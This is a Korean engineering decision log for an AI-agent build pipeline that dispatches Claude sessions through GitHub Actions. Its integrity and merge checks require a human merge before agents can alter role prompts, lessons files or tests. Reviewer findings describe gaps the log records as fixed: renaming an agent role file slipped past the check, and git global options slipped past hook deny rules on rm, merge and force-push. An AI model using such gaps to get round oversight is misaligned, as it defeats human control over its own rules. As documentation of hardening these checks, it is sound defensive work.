- **범위는 KTB-5보다 넓다.** 이 규칙에 걸리는 것은 retro의 다크 추가가 아닌 **모든** 역할 프롬프트 변경이다: `/know-thy-build:role`이 여는 PR 전부(역할 신설·Lens 수정은 정의상 `## Examples` 밖이다), `.claude/agents/**`를 건드리는 모든 패키지 업그레이드, 그리고 오타 하나 고치는 PR까지. 그 전부가 `enforce_admins` 아래에서 머지 불가였다.
- **판정의 성격이 KTB-5와 같다.** "역할 파일은 예시·관점에만 추가한다"는 **에이전트에게 거는 제약**이지 "이 diff가 규칙을 변조했다"가 아니다. 사람이 역할의 Lens를 다시 쓰는 것은 `:role` 스킬의 존재 이유이고(ADR-019의 문장 그대로 "사람의 판단 자체가 판결이다"), 그것을 막는 규칙은 정책이 잘못 놓인 것이다.
- **다만 L1에서의 계산이 보호 경로보다 무겁다.** `protectedPaths()`는 `git diff --name-status` 한 번이면 끝나지만, 섹션 판정에는 **파일 내용**이 필요하다. 그런데 merge 스테이지는 `checkoutHead`로 PR head를 체크아웃한 트리 위에서 돈다 — 워킹 트리를 읽으면 PR이 자기 판정의 재료를 고를 수 있다(KTB-5에서 `protectedPaths`가 내용을 안 읽게 만든 바로 그 이유다).
- **다크 경로의 전제가 이 규칙이다.** retro가 lessons/역할 추가 PR을 사람 없이 머지하는 근거가 "허용 섹션에 **추가만** 했다"는 것이므로, `ok`가 더 이상 그것을 보지 않게 되면 그 전제를 따로 확인해야 한다.

**결정**:

1. **`integrityCheck`는 `policy: [{file, rule}]`를 따로 싣는다.** additive-only 발견(허용 섹션 밖 편집, 삭제, "header added")은 `violations`에서 빠져 여기로 간다 — `ok`를 내리지 않는다. L0에 남는 변조 규칙은 셋뿐이다: lessons 포맷(헤더·id 형식·상한·`근거:`), 테스트 skip/ignore pragma, 판정 불가. `bin/integrity.js`는 보호 경로와 같은 모양의 알림 한 줄을 찍고 그 때문에 실패하지 않는다.
2. **`policyViolations({run, cwd, base, head, harness})`가 L1의 계산이다.** `additive_only` 글롭에 걸리는 파일만 골라, 파일별 `git diff -U0 <base>...<head> -- <file>`과 `git show <head>:<file>`로 판정한다 — **워킹 트리를 절대 읽지 않으므로 `checkoutHead` 뒤에도 안전하다**. 삭제된 파일은 `git show`가 실패하는데 그것은 판정 불가가 아니라 빈 내용이다(삭제 = 전부 removal = 위반). 그 외 git 실패는 fail-closed. 판정 본체 `additiveOnlyViolations`는 L0와 **같은 함수**다 — 갈라지면 체크가 알리는 것과 머지가 막는 것이 달라진다.
3. **merge 스테이지 단계 (3)이 두 정책을 연달아 묻는다**: `protectedPaths()` → `policyViolations()` → (그 다음에야) 게이트. 위반이면 보호 경로와 **같은 거부**다 — `factory:needs-human`, 사유 `agent role sections edited outside Examples/Perspectives — human merge required: <files> (see PR #n)`, PR에 상세 코멘트, exit 2. 계산 실패·dep 부재는 `factory:blocked`.
4. **retro의 다크 PR 선검사가 `policy`도 본다** — `integrity.policy.length > 0`이면 push도 PR도 하지 않는다. 이 PR이 사람 승인 없이 머지되는 근거가 바로 그 규칙이므로, 전제가 깨지면 자동 머지 자격이 없다.
5. **다른 소비자는 없었다.** `verify-stage`·훅·게이트 중 additive-only 위반을 읽는 코드는 없다(`integrity.js`가 유일한 생산자였다). `retro.js`·`retro/text.js`·`retro/role-additions.js`의 주석이 "그 PR도 RED다"라고 적고 있던 것은 이제 틀린 서술이라 함께 고쳤다 — 그 경로는 여전히 막히지만, 막는 것은 체크의 RED가 아니라 `publish.js`의 선검사다.

**알려진 한계**: L1의 섹션 판정은 파일당 git 호출 두 번(`diff -U0`, `show`)이라 `additive_only` 글롭에 걸리는 파일이 많은 PR에서는 호출이 선형으로 는다 — 역할 파일은 십수 개 규모라 실무상 문제가 없지만, 글롭을 넓히면 비용을 다시 봐야 한다. 그리고 L0와 L1은 같은 함수를 쓰지만 **입력 경로가 다르다**: L0는 체크아웃된 워킹 트리를, L1은 `git show`를 읽는다. 정상적인 CI에서는 같은 내용이지만, 워킹 트리가 더럽거나(스테이지가 파일을 쓴 경우) L0가 다른 커밋에서 돌면 둘의 판정이 갈릴 수 있다 — 그때 머지를 막는 쪽은 언제나 L1이다(L0는 알림일 뿐이므로 안전한 방향이다).

#### 보강 — KTB-5/6 fix round 2 (재리뷰) — 2026-09-12

f12a174을 다시 읽은 리뷰가 두 구멍을 더 찾았다. 둘 다 "한 판정을 두 개의 git 호출로 나눠 물으면 그 둘이 같은 세계를 봐야 한다"는 같은 실수다.

- **N1 — `-U0` diff에 `--no-renames`가 빠져 있었다.** fix round 1은 `--name-status` 호출에만 플래그를 붙였다. 그러면 name-status는 rename을 `D`+`A`로 펼치는데 `-U0`는 `R`로 접어서, 옮겨진 파일의 추가·삭제 줄이 **빈 집합**이 된다. `additive_only` 분기는 그 빈 집합으로 "위반 없음"을 만들고 `continue`하므로 보호 목록에도 닿지 않는다 — `mv .claude/agents/reviewer-qa.md docs/x.md`가 L0 GREEN에 `protected` 빈 목록으로 통과한다(리뷰어 실측). 두 호출 모두 `--no-renames`를 쓴다(`U0()` 헬퍼). 함께, **삭제·이동된 `additive_only` 파일은 보호 목록에도 들어간다** — 그 면제의 근거는 "허용 섹션에 추가만 했다"인데 삭제는 어떤 섹션에도 추가한 것이 아니다. 면제는 파일이 살아 있는 동안만 적용된다.
- **N2 — 사라진 경로에 내용 규칙을 걸고 있었다.** fix round 1이 한 줄의 모든 경로 필드를 세게 되면서, 삭제·이동된 `.factory/lessons/*.md`의 **옛 경로**가 `lessonsFormat(f, readFile(...) || "")`에 닿아 "lessons header missing" → L0 RED가 됐다. `readFile`이 null인 것은 "포맷이 틀렸다"가 아니라 "읽을 파일이 없다"인데 그것을 변조로 읽으면 lessons 파일을 지우는 PR을 아무도 머지할 수 없다 — KTB-5와 같은 계열의 오진이다. `--name-status`의 **상태 열을 보존**해(`changedEntries`) `D` 행(또는 `readFile` null)에는 내용 규칙(lessons 포맷·skip pragma·additive 내용 판정)을 걸지 않되, 경로는 `isProtected`·`policy` 계산에 그대로 센다.
- **훅**: git 규칙에 전역 옵션 앵커를 붙였다(`git -C <dir> rm …`, `git --git-dir=… merge …`, `git -c k=v push -f …`가 전부 규칙을 우회하고 있었다), 그리고 보호 경로를 **출발지**로 삼는 셸 `rm`/`mv`를 막는다(기존 `cp|mv` 규칙은 목적지만 봤고, `rm`에는 목적지가 아예 없다). 알려진 오탐: 경로 정규식이 파일명만 보므로 `rm -rf node_modules/foo/package.json`도 막힌다 — 경로를 앵커해 좁히면 `./package.json`·`$PWD/package.json` 우회가 생기므로, 지우지 못해 불편한 쪽을 택했다(주석으로 남겼다).

**알려진 한계(N2에서 파생)**: `.factory/lessons/**`는 `[protected].except`라 보호 목록에도 들어가지 않으므로, **lessons 파일의 삭제는 이제 L0에서도 L1에서도 아무 신호를 만들지 않는다**(전에는 오진이긴 해도 RED였다). 역할을 은퇴시키며 지우는 것은 정상 작업이라 변조로 볼 수 없지만, 누적된 교훈이 조용히 사라질 수 있는 경로이긴 하다 — 필요해지면 `policy`(사람 머지)로 올리는 것이 맞는 자리다.

#### 보강 — lessons 파일의 삭제는 `policy`(사람 머지)다

fix round 2가 "알려진 한계"로 적어 둔 구멍을 닫는다. `.factory/lessons/**`는 `[protected].except`라 보호 목록에 들어가지 않고, 삭제된 경로에는 내용 규칙도 걸리지 않으므로(N2) lessons 파일을 지우거나 옮기는 diff는 **L0에서도 L1에서도 아무 신호를 만들지 않았다** — 누적된 교훈이 조용히 사라지는 경로다. 변조로 다루지는 않는다(역할을 은퇴시키며 지우는 것은 정상 작업이고, 그것을 RED로 만들면 KTB-5와 같은 오진이 된다): `factory/lib/integrity.js`의 `integrityCheck`가 additive-only 위반과 **같은 자리**인 `policy`에 `lessons file deleted or moved away — human merge required`를 싣고, `policyViolations`(L1)도 같은 판정을 내 merge 스테이지가 자동 머지를 거부한다. 두 함수가 갈리면 체크가 알리는 것과 머지가 막는 것이 달라지므로 판정 본체를 공유한다(`lessonsGone`). rename은 `--no-renames` 덕에 `D <old>`로 보여 출발지가 그대로 잡힌다.

### ③ 산출물 추출 — KTB-7·16·17·27

세 판결 모두 같은 질문의 다른 층이다 — "백그라운드로 도는 Workflow 툴의 반환값을 세션 트랜스크립트에서 어떻게 신뢰성 있게 뽑아내는가." KTB-7이 원인(디스패처가 산출물을 요약해 통째로 날림)을 처음 잡았고, KTB-16(턴 한도)·KTB-17(후보 소스가 접수증을 보고 있었음)이 KTB-7의 수정이 실전에서 또 깨진 지점을 이었다.

#### KTB-7 — 디스패처가 workflow 결과를 요약해 스테이지가 통째로 날아갔다

**질문**: 데모 이슈 #2의 plan 스테이지(`factory-plan`, run 34691260727)가 19/19 에이전트로 정상 완주했는데(`is_error:false`, `subtype:success`, 3,594 s) `factory:needs-human`으로 떨어졌다 — 원인이 워크플로 실패가 아니라면 무엇인가.

**관측**: 설계는 "디스패처 세션의 **최종 텍스트** = workflow의 return 값"을 전제했다. 실측에서는 그 값이 약 20 KB(~640줄) JSON이었고, 모델이 그것을 다시 타이핑하다가 "재타이핑 중 전사 오류 위험이 크다"며 `"r1": [ /* full R1 positions … */ ]` 같은 **요약**을 냈다 — 게다가 JS 주석이 섞여 ```json 펜스가 `JSON.parse`에도 실패했다. 같은 커밋 근처에서 형제 결함 둘도 함께 드러났다: **D2**(`factory/lib/usage.js`의 `USAGE_RE`가 `\{[^}]*\}`라 중첩 usage 블롭을 못 맞춰 `cost_usd: 11.95`인 런을 `factory status`가 `$0 · 0/0 tokens`로 보고 — ADR-005 소비 보고가 전면 무력이었다), **D3**(`verify-stage.js`의 `extractJson`이 펜스 파싱 실패 시 조용히 균형-스캔 폴백으로 내려가 계획 안의 `done_when` 항목 하나를 산출물로 잘못 집어와 진짜 원인을 가렸다).

**결정**: 산출물 출처를 **세션 트랜스크립트의 `Workflow` tool_result**로 올렸다(신규 순수 모듈 `factory/lib/stage-artifact.js`의 `extractStageArtifact` — 트랜스크립트 → 펜스 → 맨 JSON 순으로 훑고 **스키마를 통과하는 첫 후보**가 이긴다). `run-stage.js`가 그 결과로 `.factory/out/<stage>.json`을 덮고 envelope은 `<stage>.envelope.json`으로 따로 남긴다. 디스패처 프롬프트 5개는 "생 JSON으로 통째로 그대로, 요약·축약은 **하드 실패**"로 강화했다. `USAGE_RE`는 탐욕 `\{.*\}`로, `extractJson`은 후보별 실패 사유를 한 줄씩 적도록 고쳤다(D2/D3 각각).

**재검증(같은 커밋, 재리뷰 지적 3건)**: ① `~/.claude/projects/**/*.jsonl` 업로드 경로가 `actions/upload-artifact`에서 `~`를 셸처럼 펼치지 않아 `if-no-files-found: ignore`와 겹쳐 **실패조차 없이 빈 아티팩트**가 올라가고 있었다(수정의 핵심 근거가 몇 회차째 무효) — 선행 스텝이 `CLAUDE_TRANSCRIPTS=$HOME/.claude/projects`를 `GITHUB_ENV`로 굳히고 경로를 `${{ env.CLAUDE_TRANSCRIPTS }}/**/*.jsonl`로 바꿨다(`yml-lint`에 `tilde-path` 규칙 추가). ② `bin/retro.js`가 옛 `extractJson`을 쓰고 있었다 — `retro.v1`도 같은 이유로 회차가 날아갈 수 있어 `extractStageArtifact` + 트랜스크립트 후보로 옮기고 `factory-retro.yml`에도 트랜스크립트 업로드를 더했다. ③ `bin/verify-stage.js`(진단 CLI)가 트랜스크립트를 아예 보지 않아 CI와 다른 답을 냈다 — `--transcript <path>`와 봉투 `session_id` 자동 탐색을 더하고 경로 계산 `readTranscript()`를 `lib/stage-artifact.js`로 올려 세 진입점이 같은 계산을 쓰게 했다.

**알려진 한계**: 이 수정 자체가 다시 두 번 더 깨졌다(KTB-16: 턴 한도가 산출물이 도착하기 전에 세션을 죽임, KTB-17: 트랜스크립트 후보가 접수증만 보고 있었음) — "산출물이 트랜스크립트 안에 있다"는 KTB-7의 전제는 옳았지만 "어디를 어떻게 읽어야 그것이 나오는가"는 실전에서 계속 갱신됐다.

**영향**: `factory/lib/stage-artifact.js`(신규), `factory/lib/usage.js`(D2), `factory/lib/verify-stage.js`(D3), `factory/bin/run-stage.js`·`bin/retro.js`·`bin/verify-stage.js`, `factory/lib/yml-lint.js`(`tilde-path`), 디스패처 프롬프트 5개, 워크플로 템플릿 4개(트랜스크립트 업로드). 테스트: `stage-artifact.test.js`(신규 8건)·`usage.test.js`(회귀 1건)·`verify-stage-cli.test.js`(신규 7건)·`retro-bin.test.js`(4건)·`verify-stage.test.js`(1건)·`yml-lint.test.js`. sha `516ac5a` + `9c3346d`(run-stage 부분) + `9c61315`.

#### KTB-16 — `--max-turns 5`가 plan을 죽였다: 한도는 하네스가 정하고, 턴 한도는 blocked다

**질문**: KTB-13 배포 후 재큐된 데모 #2의 plan 재실행(run 34700674634)이 30분 18초·**$12.05**를 태우고 산출물 없이 끝났다 — `is_error: true`, `subtype: error_max_turns`, `terminal_reason: max_turns`, `num_turns: 6`. `bin/run-stage.js`는 `--max-turns 5`를 **하드코딩**하고 있었다.

`orchestration = "workflow"`에서 `Workflow` 툴은 **백그라운드**로 돈다(KTB-17). 그래서 디스패처가 쓰는 턴은 최소 ① Workflow 호출 ② 접수증 수신 ③ 완료 알림 수신 ④ 산출물 출력이고, 알림의 `<result>`가 잘려 output 파일을 `Read`로 읽어야 하면 **조각 수만큼** 더 붙는다. 같은 프롬프트·같은 이슈의 직전 실행은 3턴으로 끝났다 — 경계에 걸려 있었고, 이번엔 넘었다.

더 나쁜 것은 **사유가 원인을 숨긴다**는 점이다. 이슈에 남은 전이 사유는 "claude -p reported is_error; no candidate matched the stage schema — **no JSON object in result**"인데, 이건 결과가 아니라 증상이다. 사람은 "에이전트가 JSON을 안 냈다"로 읽고 프롬프트를 의심한다.

**결정**:

1. **한도는 하네스가 정한다.** `[factory].max_turns`(기본 **12**) + `[factory.max_turns_by_stage].<stage>` 오버라이드. 12는 이론값이 아니라 관측값이다 — 위 네 턴 + output 파일 조각 4개 + 여유. `loadHarness`가 기본값을 채우고 `stageMaxTurns()`가 읽는다(정수가 아니면 조용히 쓰지 않고 기본값으로 떨어진다). 템플릿 `harness.toml`에 근거 주석과 함께 실린다.
2. **doctor가 범위를 잡는다.** `factory.max_turns`는 정수 **3–50**이어야 한다 — 하한은 백그라운드 디스패처의 최소 턴, 상한은 "한 스테이지가 50턴을 쓰고 있다면 그건 한도 문제가 아니다"는 선이다. 오타로 12가 120이 되면 잘못된 프롬프트가 몇 시간·수백 달러를 태운다. 키가 없으면 WARN + `init --upgrade` 안내(기본값이 적용되므로 FAIL은 아니다).
3. **사유가 원인을 말한다.** `terminal_reason === "max_turns"`이거나 `subtype === "error_max_turns"`면(CLI 버전에 따라 한쪽만 온다 — 둘 다 본다) run 기록/전이 사유의 첫 줄이 `claude -p hit max turns (<n>)`이고, 스키마 진단은 그 뒤에 부가 정보로 붙는다.
4. **등급은 `factory:blocked`다.** 턴 한도는 설계 오류가 아니라 **재시도로 풀리는 일시 조건**이다 — gates BLOCKED·머지 API 실패와 같은 자리다. 그래서 `factory:queue → blocked`·`factory:ready → blocked` 엣지를 그래프에 더했다: 이 두 상태에 blocked 출구가 없으면 triage·plan은 blocked를 요청했다가 거부당해 **라벨이 그대로 남는다**(이슈가 아무 표식 없이 제자리에 앉는다). blocked는 막다른 곳이 아니다 — sweeper가 유예 뒤 needs-human으로 올리고 needs-human → queue로 다시 돈다. 같은 엣지를 KTB-14 r1(판정 불가 워크트리 체크)도 쓴다.
5. **단, 트랜스크립트를 먼저 본다(KTB-17).** 백그라운드 워크플로는 이미 끝났을 수 있다 — `max_turns`인데 스키마를 통과하는 산출물을 실제로 복구했으면 그 런은 **성공**이다. 그때는 게이트도 돈다(건너뛰면 복구한 산출물이 "gates file missing"으로 되떨어져 복구가 무의미해진다). 복구하지 못했을 때만 4의 blocked다.

**영향**: `factory/bin/run-stage.js`(`DEFAULT_MAX_TURNS`·`stageMaxTurns`·게이트 게이팅·verify 실패 등급), `factory/lib/verify-stage.js`(`hitMaxTurns`·`maxTurnsReason`), `factory/lib/config.js`, `factory/lib/doctor/harness.js`, `factory/lib/labels.js`, `templates/factory/factory/harness.toml`, 테스트 4종.

#### KTB-17 — 백그라운드 `Workflow`의 반환값은 tool_result에 없다: 알림과 output 파일을 본다

**질문**: KTB-7이 세운 "1순위 출처는 트랜스크립트의 `Workflow` tool_result"가 **작동하지 않았다**. 관측자가 같은 아티팩트로 폴백 경로만 떼어 재생했을 때 나온 1,340자는 계획이 아니라 접수증이었다:

```
Workflow launched in background. Task ID: w6xdqhynw
Summary: Issue plan via a role debate: …
Transcript dir: …/subagents/workflows/wf_29845d65-aa6
You will be notified when it completes.
```

`Workflow` 툴은 백그라운드로 돈다. 실제 반환값은 한참 뒤 **USER 텍스트 블록**으로 온다:
`<task-notification>…<status>completed</status><output-file>…</output-file><result>{raw JSON}</result></task-notification>`.
그리고 두 가지가 더 있다 — 실제 트랜스크립트(run 34700674634, 60줄)를 열어 확인한 사실이다:

- 알림의 `<result>`는 길면 **잘린다**: 그 런에서 45 KB짜리 반환값이 8,179자 + `"... (truncated 36707 chars, full result in /tmp/…/w6xdqhynw.output)"`로 왔다. 잘린 텍스트는 유효한 JSON이 아니다.
- 그래서 디스패처는 `<output-file>`을 `Read`로 읽는데, 한 번에 다 오지 않는다: 525줄 파일이 `offset`/`limit`으로 **네 조각**(1–129, 130–329, 330–523, 524–525)으로 왔고 각 조각은 `N\t` 줄 번호가 붙은 텍스트다. **어느 조각도 단독으로는 유효한 JSON이 아니다.**

즉 계획은 트랜스크립트 안에 **온전히 있었는데**(줄 번호를 키로 다시 붙이면 `{summary,agentCount,logs,result}` 봉투의 `.result`가 `plan.v1`을 통과한다) 폴백은 접수증만 보고 "no JSON object in result"라고 답했다.

**결정**: 후보 순서를 바꾸고, 조각을 다시 붙인다.

1. **completed인 마지막 `<task-notification>`의 `<result>`.** 상태가 completed가 아닌 알림의 `<result>`는 산출물이 아니므로 후보로도 올리지 않는다.
2. **`Read` tool_result를 파일별로 줄 번호 순서대로 재조립한 내용**, 그다음 개별 tool_result 하나하나. 둘 다 `^\d+\t` 접두를 벗기고, 바깥 객체에 `summary`·`agentCount`·`logs` 중 하나라도 있으면 `result`/`data`를 **한 겹만** 벗긴다(더 깊이 파면 "파싱은 되는" 중첩 객체가 다시 밀려들어와 KTB-7이 고친 오진이 돌아온다. 산출물 자신에게도 `summary`가 있으므로 "`result` 키가 있으면 무조건"으로 두지 않는다). 파일별로 나누는 이유: 서로 다른 파일의 1번 줄이 겹치면 조용히 뒤섞인 텍스트가 만들어진다. 같은 번호가 다시 오면 나중 것이 이긴다(다시 읽은 것이므로).
3. **`Workflow` tool_result — 접수증이 아닐 때만.** 전경에서 도는 워크플로는 여기로 반환값을 준다. 접수증(`^\s*Workflow launched in background`)은 건너뛰고, 그 사실을 사유에 남긴다(`the Workflow tool result is a background receipt, not a return value`) — 그래야 다음 사람이 "JSON이 없다"가 아니라 "엉뚱한 자리를 봤다"를 읽는다.
4. 그다음이 봉투의 ```json 펜스와 맨 JSON(전과 같다).

후보는 전과 같이 **전부 스키마로 채점**하고 통과하는 첫 것이 이긴다. 큰 텍스트(파일 내용·조각)에는 전체 균형 스캔 대신 **선두 객체 하나**만 본다 — 100 KB tool_result마다 중괄호 수만큼 다시 훑으면 검증이 눈에 띄게 느려지고, 산출물 파일은 언제나 `{`로 시작하며 그 안쪽 중첩 객체는 애초에 후보가 아니다.

**검증(재현)**: 실제 run 34700674634 아티팩트에 `verify-stage` CLI를 그대로 돌렸다 —
`{"ok":true,"reasons":[],"transcript":"…/d6799532-04d3-4e0f-9ca3-79be28d7c9d1.jsonl"}`.
수정 전 그 런의 run 기록은 `verify: FAIL / - claude -p reported is_error / - no candidate matched the stage schema — no JSON object in result`였다. 그 트랜스크립트를 다듬은 픽스처(`factory/test/fixtures/plan-max-turns.jsonl` — 구조 그대로, 토론 산문만 축약)가 테스트에 들어 있다.

**영향**: `factory/lib/stage-artifact.js`(`taskNotificationsFromTranscript`·`fileReadsFromTranscript`·`toolResultTextsFromTranscript`·`isWorkflowReceipt`·`stripLineNumbers`·후보 순서), `factory/test/stage-artifact.test.js`, 픽스처.

**리뷰 leftover(M4)**: `stripLineNumbers`/`fileReadsFromTranscript`의 줄 번호 접두 정규식 `^\d+\t`는 실제 `Read` 출력(`cat -n`처럼 오른쪽 정렬해 공백으로 채운 번호, 예: `"     9\t"`)의 앞 공백을 매치하지 못해 그 줄을 못 벗기고 그대로 흘려보냈다 — 여러 조각으로 온 큰 파일을 재조립할 때 조용히 깨질 수 있는 지점이다. `^\s*(\d+)\t`로 고쳤다. 영향: `factory/lib/stage-artifact.js`. 테스트: `stage-artifact.test.js`(패딩 섞인 다중 조각 재조립 픽스처).

#### KTB-27 — `$1`/`$2`는 치환되지 않는다: 다섯 디스패처 모두 `$ARGUMENTS`로 되돌린다

`claude -p "/argtest 42 true"`로 실측하니 `$ARGUMENTS`("42 true")는 치환됐지만 `$1`은 `true`로, `$2`는 리터럴 `$2`로 남았다 — KTB-23 r1이 `factory-implement.md`를 위치 인자(`$1`/`$2`)로 바꾼 전제 자체가 틀렸고, 그 상태로는 매 implement 스테이지가 깨진 args로 `Workflow`를 호출했을 것이다. 다섯 디스패처를 `$ARGUMENTS` 하나만 쓰는 형태로 되돌리되, implement는 그 문자열이 두 토큰(`"<issue> <harness_issue>"`)이므로 `{ raw: "$ARGUMENTS" }`로 넘기고 워크플로가 공백 split으로 파싱한다(`args.issue`/`args.harness_issue`는 하위 호환으로 유지); `run-stage.js`의 `stagePrompt()`는 이미 `/factory-implement <n> true|false` 한 줄을 내고 있어(그 전체가 `$ARGUMENTS`가 된다) 바뀌지 않는다.

**영향**: `templates/factory/claude/commands/factory-implement.md`(+ 설치본 `.claude/commands/`), `templates/factory/claude/workflows/factory-implement.js`(+ 설치본 `.claude/workflows/`), `factory/bin/run-stage.js`(주석만 — 산출 프롬프트는 이미 옳았다). 테스트: `templates.test.js`(다섯 디스패처 md 모두 `$1`/`$2` 부재), `workflows.test.js`(`raw: "2 true"`→하네스 변형 프롬프트, `raw: "2"`→평시 규칙, `args.issue`/`args.harness_issue` 폴백).

### ④ 워크플로 동시성·재시작 — KTB-8·9·10·15·15b·18·19·22·24·25·26·28·29·30·31·32·35

한 이슈의 라벨 전이 하나가 GitHub Actions concurrency 그룹·재시도·머지 재확인이라는 세 겹의 타이밍 문제를 연달아 드러냈다. KTB-9(tier 라벨 부여)는 이 배치(KTB-8과 같은 커밋 계열)에서 함께 고쳐졌고 `run-stage.js`의 같은 진입 경로를 바꾸므로 여기 둔다 — 브리프가 명시한 여섯 항목(KTB-8/10/15/15b/18/19)에 KTB-9를 더한 것이며, 이 재배치 자체를 Task 7 반환 사항에 기록한다.

#### KTB-8 — 스테이지 워크플로가 공유 concurrency 그룹에서 서로를 취소했다

**질문**: `issues: labeled` 이벤트 하나가 스테이지 워크플로 5개의 런을 전부 만드는데(GitHub는 트리거에 라벨 이름 필터를 주지 않는다 — 필터는 잡 레벨 `if`다), 다섯이 `concurrency.group: factory-issue-<n>`을 공유하고 있었다. `cancel-in-progress: false`에서도 GitHub는 그룹당 실행 1 + 대기 1만 유지하므로 새 웨이브가 직전 대기 런을 취소한다 — 데모 #2에서 조건이 맞는 유일한 런(`factory-plan`)이 생성 1초 만에 밀려나고 이슈가 `factory:ready`에 기록 하나 없이 멈췄다. 공유 그룹이 무엇을 보장한다고 믿고 있었는가, 그리고 런이 **만들어지지도 않은** 정지를 누가 본다고 믿고 있었는가.

**결정**:

1. **그룹을 워크플로별로 가른다** — `factory-issue-${{ github.event.issue.number || inputs.issue }}-<stage>`(`templates/factory/github/workflows/factory-{triage,plan,implement,review,merge}.yml`). 이슈 단위 상호배제는 처음부터 concurrency가 아니라 `factory/lib/claim.js`의 원자적 락 브랜치 claim(`refs/heads/factory/lock-<issue>` 원격 push, 두 번째 러너는 `{ok:false, holder}`로 fail closed)이 주고 있었다 — 공유 그룹은 보호를 더하지 않으면서 스테이지를 죽이는 레이스만 만들었다. yml 주석이 그 사실을 명시하고, `factory/test/yml-lint.test.js`가 다섯 그룹 문자열이 pairwise distinct임을 고정한다.
2. **재점화는 `workflow_dispatch`뿐이다** — 라벨이 이미 목적 상태에 있으면 같은 라벨을 또 붙여도 `labeled` 이벤트가 나지 않으므로 라벨로는 되살릴 수 없다. 스테이지 5개에 `inputs.issue`를 달고 잡 조건을 `github.event_name == 'workflow_dispatch' || contains(...)`로, 이슈 번호를 `github.event.issue.number || inputs.issue`로 바꿨다(`run-stage.js`는 이미 argv에서 읽는다). 사람·컨트롤러용 같은 손잡이가 `factory/cli/run.js`의 `factory run <stage> <issue> --remote`다 — 로컬 실행 없이 dispatch만 하고, `merge`도 받는다(브랜치 보호가 막는 것은 로컬 실행이지 CI dispatch가 아니다).
3. **sweeper의 세 번째 팔**(`factory/lib/sweeper.js`, `factory/bin/sweep.js`) — `factory:ready|planned|awaiting-review|approved`에 앉아 있고 ① 마지막 전이 코멘트(`factory-transition:v1`)가 `staleMinutes`보다 오래됐고 ② 그 창 안에 갱신된 하트비트가 없고 ③ 재점화 마커가 없는 이슈를 `gh workflow run factory-<stage>.yml -f issue=<n>`으로 다시 띄우고 `<!-- factory-sweeper restarted stage=<stage> issue=<n> -->`를 남긴다. 하트비트 확인이 "in-flight 런 조회"를 대신한다 — `gh run list`보다 싸고, 이미 이 파일이 읽는 데이터이며, 스테이지가 살아 있다는 1차 증거다(plan은 37분 동안 `factory:ready`에 머문다). 전이 코멘트가 아예 없으면 판단하지 않는다(나이를 모르는 것을 "오래됐다"로 읽지 않는다). ~~중복 dispatch 자체는 무해하다 — 락 claim이 두 번째 러너를 fail closed 시킨다.~~ **(KTB-10에서 정정: 이 문장은 틀렸다.** 같은 그룹의 PENDING 런은 앞 런이 끝난 뒤에 시작하므로 락이 이미 풀려 있다 — 중복 실행을 실제로 막는 것은 `run-stage.js`의 진입 상태 가드다.**)** 워크플로에 `permissions: actions: write`를 더했다.

**알려진 한계**: 스테이지 5개를 `factory-stage.yml` 하나로 합쳐 라벨로 분기하면 라벨 이벤트당 런이 1개뿐이라 그룹 경합도 팬아웃 로그 잡음(매 전이마다 취소 4건)도 사라진다 — 위 ①보다 옳지만 변경 폭이 커서 채택하지 않았다. 그리고 취소된 런은 잡 로그·아티팩트·코멘트를 아무것도 남기지 않으므로(도그푸드 O8), 정지의 사후 조사는 여전히 90일짜리 Actions 기록에 의존한다.

#### KTB-9 — tier 라벨을 붙이는 코드가 어디에도 없었다

**질문**: 스펙 §3.2는 triage가 `factory:tier-docs|standard|load-bearing`을 부여한다고 적었고 `factory/lib/label-catalog.js`가 셋을 정의해 `bootstrap`이 만들기까지 하는데, `addLabels`를 부르는 곳은 retro 경로뿐이었다. tier가 handoff JSON 안에만 있으면 사람은 이슈 목록에서 tier를 볼 수 없다 — 라벨은 사람이 읽는 표식이므로 이것은 문서와 코드의 드리프트다.

**결정**: `factory/bin/run-stage.js`가 triage handoff를 **검증한 뒤**(`verifyStage` 통과 뒤 — 검증 전의 tier는 에이전트의 자기 신고다) `gh.setTierLabel(issue, factory:tier-<tier>)`로 그 tier를 붙이고 다른 `factory:tier-*`를 같은 `gh issue edit` 호출에서 뗀다. `setFactoryLabel`을 재사용하지 않는다 — 그것은 `labels.js`의 `STATES`만 보므로 태우면 상태 라벨이 떨어져 나간다(tier는 상태와 **직교**하되 이슈당 하나다; `TIERS`·`tierLabel()`·`TIER_LABELS`를 `factory/lib/labels.js`에 뒀다). 라벨 적용 실패는 런 기록 한 줄로만 남기고 스테이지를 죽이지 않는다 — 판정의 재료는 계속 handoff의 tier이고(게이트·로스터·`factory status`), 라벨은 그 사실의 사본일 뿐이다.

#### KTB-10 — 중복 실행을 막는 것은 락이 아니라 진입 상태 가드다

**질문**: KTB-8은 concurrency 그룹을 워크플로별로 갈라 "조건이 맞는 런이 취소되는" 정지를 없앴고, 재점화 경로(`workflow_dispatch` + sweeper의 세 번째 팔)를 열었다. 그런데 그 ADR은 "중복 dispatch 자체는 무해하다 — 락 claim이 두 번째 러너를 fail closed 시킨다"고 적었다. 그 문장이 참인가.

**관측**: 참이 아니다. 락 claim이 되돌려 세우는 것은 **동시에** 도는 두 번째 러너인데, 같은 그룹에 PENDING으로 걸린 dispatch는 그룹당 실행 1 + 대기 1이라는 성질 때문에 **원래 런이 끝난 뒤에** 시작한다 — 그때 락은 이미 해제돼 있다. 그래서 PENDING 런은 스테이지를 처음부터 다시 돌고, 전이 그래프(`factory:planned → factory:planned`은 없다)가 그것을 거부하는 것은 `claude -p`가 이미 끝난 **뒤**다: plan 한 번 ~$12, 그리고 이슈에는 중복 handoff 코멘트가 남는다. sweeper가 30분마다 이 실수를 반복할 수 있는 구조였다.

**결정**:

1. **진입 상태 가드**(`factory/bin/run-stage.js`) — claim이 성공한 직후(로컬 진입 §4.2.5 **뒤**: 그 경로가 `backlog → factory:queue`를 바로 그 자리에서 만든다) 이슈의 현재 factory 상태 라벨을 읽어, 그것이 이 스테이지의 진입 라벨(`ENTRY_LABELS`, `factory/lib/labels.js` — triage `factory:queue` · plan `factory:ready` · implement `factory:planned|factory:rework` · review `factory:awaiting-review` · merge `factory:approved`)이 아니면 `entry state <label> != expected <…> — nothing to do` 한 줄만 남기고 exit 0으로 물러난다. 전이도, handoff도, `claude -p`도 없다. 라벨을 읽지 못하면(조회 실패·상태 라벨 2개) **막지 않는다** — 이것은 비용 방어이지 안전 게이트가 아니고, 실제 안전은 여전히 전이 그래프가 쥔다. `sweeper.js`의 세 겹 dedupe는 이 가드 앞단의 비용·잡음 절감으로 위치를 다시 적었다.
